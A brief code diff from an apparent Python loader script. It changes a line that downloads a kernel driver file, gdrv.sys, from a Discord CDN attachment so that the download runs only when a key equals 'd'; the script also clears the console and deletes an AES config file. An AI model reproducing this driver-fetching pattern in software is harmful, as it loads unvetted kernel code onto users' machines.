@@ -25,7 +25,8 @@ def dl_anything_file(url, file_name):
         print("")
     else:
         print(f"")
-dl_anything_file("https://cdn.discordapp.com/attachments/1198653708511215736/1320957399682519145/gdrv.sys?ex=676b7cf2&is=676a2b72&hm=214b2c82fbbe66bc4585fe831ed1766aebfc5ca2bc5dbd6ea0939922d73b839d&","gdrv.sys")
+if cskey=="d":
+    dl_anything_file("https://cdn.discordapp.com/attachments/1198653708511215736/1320957399682519145/gdrv.sys?ex=676b7cf2&is=676a2b72&hm=214b2c82fbbe66bc4585fe831ed1766aebfc5ca2bc5dbd6ea0939922d73b839d&","gdrv.sys")
 os.system('cls')
 if os.path.isfile(file_pathaesconfig):
     os.remove(file_pathaesconfig)
